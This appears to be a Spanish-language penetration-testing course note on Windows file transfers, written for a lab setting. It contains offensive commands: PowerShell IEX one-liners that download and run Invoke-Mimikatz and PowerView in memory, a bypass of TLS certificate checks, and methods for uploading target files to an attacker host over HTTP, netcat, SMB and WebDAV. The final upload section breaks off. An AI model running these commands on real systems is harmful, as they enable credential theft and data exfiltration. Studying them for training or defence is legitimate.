Usemos la publicación del blog [Microsoft Astaroth Attack](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/) como ejemplo de una **amenaza persistente avanzada** (APT). La publicación del blog comienza hablando de amenazas sin archivos. El término sin archivos sugiere que una amenaza no viene en un archivo, sino que ==utiliza herramientas legítimas integradas en un sistema para ejecutar un ataque==. Esto no significa que no haya una operación de transferencia de archivos. El archivo no está "presente" en el sistema, sino que **se ejecuta en la memoria**.

El **ataque Astaroth** generalmente siguió estos pasos: un enlace malicioso en un correo electrónico de phishing dirigido condujo a un archivo **LNK**. Al hacer doble clic en el archivo **LNK**, se ejecutaba la herramienta **WMIC** con el parámetro `/Format`, que **permitía la descarga y ejecución de código JavaScript malicioso**. El código JavaScript, a su vez, descarga payloads mediante el uso indebido de la herramienta **Bitsadmin**.

Todos los payloads se codificaron en **base64** y se decodificaron utilizando la herramienta **Certutil**, lo que dio como resultado algunos archivos DLL. Luego se utilizó la herramienta **regsvr32** para cargar una de las DLL decodificadas, que descifró y cargó otros archivos hasta que se inyectó el payload final, Astaroth, en el proceso `Userinit`. A continuación, se muestra una representación gráfica del ataque.
![[file_transfer_windows.png]]

# Operaciones de descarga de archivos
Una vez **tenemos acceso a la máquina objetivo y necesitamos descargar un archivo desde nuestra máquina atacante**, podemos lograr esto usando varios métodos de descarga de archivos.


## 1.- Codificación y decodificación de Base64 de PowerShell
Si tenemos acceso a una terminal, podemos **codificar un archivo en una cadena base64**, copiar su contenido desde la terminal y realizar la operación inversa, decodificando el archivo en el contenido original. 

Podemos utilizar [md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html), un programa que ==calcula y verifica sumas de comprobación MD5 de 128 bits==. El hash **MD5** funciona como una huella digital compacta de un archivo, lo que significa que un archivo ==debe tener el mismo hash MD5 en todas partes==. Intentemos transferir una clave ssh de muestra. 


### Pwnbox comprueba el hash MD5 de la clave SSH
```shell
md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```


### Pwnbox codifica la clave SSH en Base64
```shell
cat id_rsa | base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVU
```

Podemos copiar este contenido y pegarlo en una terminal de Windows PowerShell y usar algunas funciones de PowerShell para decodificarlo:

```powershell
C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```


### Confirmación de la coincidencia de hashes MD5
Finalmente, podemos ==confirmar si el archivo se transfirió exitosamente== utilizando el cmdlet [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2), que **hace lo mismo que md5sum**.

```powershell
C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                Path                                  
---------          --------                                   --------                                
MD5           4E301756A07DED0A2DD6953ABF015278      C:\Users\Public\id_rsa                                 
```
>[!Nota]
   >
   >Si bien este método es conveniente, **no siempre es posible utilizarlo**. La utilidad de línea de comandos de Windows (cmd.exe) ==tiene una longitud máxima de cadena de 8191 caracteres==. Además, un shell web puede generar un error si intenta enviar cadenas extremadamente largas..


## 2.- Descargas web de PowerShell
La **mayoría de las empresas permiten el tráfico saliente HTTP y HTTPS a través del firewall** para permitir la productividad de los empleados. Aprovechar estos métodos de transporte para las operaciones de transferencia de archivos es muy conveniente. Aun así, ==los defensores pueden usar soluciones de filtrado web== para evitar el acceso a categorías de sitios web específicas, bloquear la descarga de tipos de archivos (como .exe) o solo permitir el acceso a una lista de dominios incluidos en la lista blanca en redes más restringidas.

PowerShell ofrece muchas opciones de transferencia de archivos. En cualquier versión de PowerShell, la clase [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) **se puede usar para descargar un archivo a través de HTTP, HTTPS o FTP**. La siguiente [tabla](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describe los métodos de **WebClient** para descargar datos de un recurso:

| **Función**                                                                                                              | **Descripción**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |


### Función DownloadFile de PowerShell
Podemos especificar el nombre de la clase **Net.WebClient** y el método **DownloadFile** con los parámetros correspondientes a la URL del archivo de destino a descargar y el nombre del archivo de salida:

```powershell
C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```


### PowerShell DownloadString: función sin archivos
Como ya hemos comentado, los **ataques sin archivos** funcionan mediante el uso de algunas funciones del sistema operativo para descargar el payload y ejecutarlo directamente. PowerShell también se puede utilizar para realizar ataques sin archivos. En lugar de descargar un script de PowerShell en el disco, ==podemos ejecutarlo directamente en la memoria== mediante el cmdlet [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) o el alias **IEX**.

```powershell
C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

**IEX** también acepta ==entradas de tuberías==:

```powershell
C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```


### PowerShell Invoke-WebRequest
A partir de PowerShell 3.0, el cmdlet [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) también está disponible, pero es **notablemente más lento al descargar archivos**. Puede utilizar los alias `iwr`, `curl` y `wget` en lugar del nombre completo de Invoke-WebRequest.

```powershell
C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

>[!Importante]
   >
   >**Harmj0y** ha compilado una ==lista extensa de bases de descarga de PowerShell== [aquí](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). Vale la pena familiarizarse con ellas y sus matices, como la falta de reconocimiento de proxy o la necesidad de tocar el disco (descargar un archivo en el destino) para seleccionar la adecuada para la situación.


### Errores comunes con PowerShell
Puede haber casos en los que ==la configuración inicial de Internet Explorer no se haya completado==, lo que impide la descarga. Esto **se puede evitar** utilizando el parámetro `-UseBasicParsing`.

```powershell
C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Otro error en las descargas de PowerShell está relacionado con el canal seguro **SSL/TLS** si el ==certificado no es de confianza==. Podemos evitar ese error con el siguiente comando:

```powershell
C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```


## 3.- Descargas SMB
El protocolo [[📂🔗 SMB]] que se ejecuta en el puerto TCP/445 es ==común en redes empresariales donde se ejecutan servicios de Windows==. Permite que las aplicaciones y los usuarios **transfieran archivos hacia y desde servidores remotos**.

Podemos usar SMB para descargar archivos desde nuestra máquina fácilmente. Necesitamos crear un servidor SMB en nuestra máquina atacante con [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)desde **Impacket** y luego usar `copy`, `move`, `PowerShell Copy-Item` o cualquier otra herramienta que permita la conexión a SMB.

```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```


### Copiar un archivo desde el servidor SMB
Para descargar un archivo del servidor SMB al directorio de trabajo actual, podemos usar el siguiente comando:

```powershell
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```

Las **nuevas versiones de Windows** ==bloquean el acceso de invitados no autenticados==, como podemos ver en el siguiente comando:

```powershell
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```


### Crear un servidor SMB con nombre de usuario y contraseña para transferir archivos
Para **transferir archivos**, podemos ==establecer un nombre de usuario y una contraseña usando nuestro servidor SMB Impacket==:

```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```


### Montar el servidor SMB con usuario y contraseña en la máquina Windows víctima
```powershell
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```
>[!Nota]
>
También puedes montar el servidor SMB si **recibes un error** cuando usas `copy filename \\IP\sharename`.


## 4.- Descargas FTP
Otra forma de transferir archivos es mediante [[📂🔄 FTP]], que utiliza los puertos TCP/21 y TCP/20. Podemos utilizar el **cliente FTP** o **PowerShell Net.WebClient** ==para descargar archivos desde un servidor FTP==. 

Podemos configurar un servidor FTP en nuestro host de ataque utilizando el módulo **pyftpdlib** de Python3. Se puede instalar con el siguiente comando:

```shell
sudo pip3 install pyftpdlib
```

Luego podemos ==especificar el puerto número 21== porque, de forma predeterminada, **pyftpdlib usa el puerto 2121**. La ==autenticación anónima está habilitada de forma predeterminada== si no configuramos un usuario y una contraseña.

```shell
sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```
>[!Nota]
>
Una vez configurado el servidor FTP, podemos realizar transferencias de archivos utilizando el cliente FTP preinstalado desde Windows o PowerShell Net.WebClient.



### Transferencia de archivos desde un servidor FTP mediante PowerShell
```powershell
C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

>[!Importante]
>
>Cuando obtenemos un shell en una máquina remota, es **posible que no tengamos un shell interactivo**. Si ese es el caso, podemos crear un archivo de comandos FTP para descargar un archivo. Primero, ==necesitamos crear un archivo que contenga los comandos que queremos ejecutar== y luego **usar el cliente FTP para ejecutarlo**.


#### Crear un archivo de comandos para el cliente FTP y descargar el archivo de destino
```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```


# Operaciones de subida de archivos
También existen situaciones como el descifrado de contraseñas, el análisis, etc., en las que **debemos subir archivos desde nuestra máquina objetivo a nuestro host de ataque**. Podemos utilizar los ==mismos métodos que utilizamos para la operación de descarga==, pero ahora para las subidas.

## 1.- Codificación y decodificación de Base64 de PowerShell
Vimos cómo decodificar una cadena base64 con PowerShell. Ahora, **haremos la operación inversa** y ==codifiquemos un archivo para que podamos decodificarlo en nuestro host de ataque==.


### Codificar archivo con PowerShell en la máquina objetivo
```powershell
C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=

C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```


### Decodificar archivo en la máquina atacante
Copiamos el contenido codificado y **lo pegamos en nuestro host de ataque**, usamos el comando `base64` para decodificarlo y usamos la aplicación **md5sum** para confirmar que la transferencia se realizó correctamente.
```shell
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```
```shell
md5sum hosts 

3688374325b992def12793500307566d  hosts
```


## 2.- Subidas web de PowerShell
==PowerShell no tiene una función incorporada para operaciones de subida==, pero podemos **usar Invoke-WebRequest o Invoke-RestMethod** para crear nuestra función de subida. También necesitaremos un servidor web que acepte subidas, lo cual **no es una opción predeterminada** en la mayoría de las utilidades de servidor web más comunes.

Para nuestro servidor web, podemos **usar** [uploadserver](https://github.com/Densaugeo/uploadserver), un módulo extendido del [HTTP.server module](https://docs.python.org/3/library/http.server.html) de Python, que incluye una página de subida de archivos. Lo instalaremos e iniciaremos el servidor web:

```shell
pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```
```shell
python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Ahora podemos usar un script de PowerShell [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) que usa **Invoke-RestMethod** ==para realizar las operaciones de subida==. El script acepta dos parámetros: `-File` (que **usamos para especificar la ruta del archivo**) y `-Uri` (**la URL del servidor** donde subiremos nuestro archivo):

```powershell
C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```


## 3.- Subida web de PowerShell Base64
Otra forma de usar **PowerShell y archivos codificados en base64** para operaciones de subida es mediante el uso de `Invoke-WebRequest` o `Invoke-RestMethod` junto con **Netcat**. Usamos Netcat ==para escuchar en un puerto que especificamos y enviamos el archivo como una solicitud== `POST`. Finalmente, copiamos la salida y usamos la función de decodificación base64 para convertir la cadena base64 en un archivo:

```powershell
C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

**Capturamos los datos base64 con Netcat** y usamos la aplicación base64 con la opción de decodificación para convertir la cadena al archivo:

```shell
nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...
```
```shell
echo <base64> | base64 -d -w 0 > hosts
```


## 4.- Subidas SMB
Normalmente, las empresas **no permiten** el protocolo [[📂🔗 SMB]] fuera de su red interna porque puede exponerlas a posibles ataques. Para obtener más información sobre esto, podemos leer la publicación de [Microsoft Prevención del tráfico SMB desde conexiones laterales y que entra o sale de la red](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).

Una ==alternativa es ejecutar SMB sobre HTTP== con **WebDAV** [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918), que es una extensión de HTTP. Este protocolo ==permite que un servidor web se comporte como un servidor de archivos==, lo que permite la creación de contenido colaborativo. **WebDAV también puede utilizar HTTPS**.

Cuando se utiliza SMB, primero intentará conectarse mediante el protocolo SMB y, ==si no hay ningún recurso compartido SMB disponible==, **intentará conectarse mediante HTTP**. En la siguiente captura de **Wireshark**, intentamos conectarnos al recurso compartido de archivos `testing3` y, como no encontró nada con SMB, vemos como se usa HTTP:
![[smb_upload.PNG]]


### Configuración del servidor WebDav
Para configurar nuestro servidor WebDav, necesitamos instalar dos módulos de Python: **wsgidav** y **cheroot** (se puede encontrar más información acerca de esta implementación aquí: [wsgidav github](https://github.com/mar10/wsgidav)). Después de instalarlos, ejecutamos la aplicación wsgidav en el directorio de destino.

```shell
sudo pip3 install wsgidav cheroot

[sudo] password for plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...
```
```shell
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

[sudo] password for plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
```


### Conexión al recurso compartido
Ahora podemos intentar ==conectarnos al recurso compartido== mediante el directorio **DavWWWRoot**.

```powershell
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```
>[!Nota]
>
>**DavWWWRoot** es una palabra clave especial ==reconocida por el Shell de Windows==. No existe una carpeta de este tipo en su servidor WebDAV. La palabra clave DavWWWRoot ==le indica al controlador del minirredirector==, que maneja las solicitudes WebDAV, **que se está conectando a la raíz del servidor WebDAV**.


### Subir archivos usando SMB
```powershell
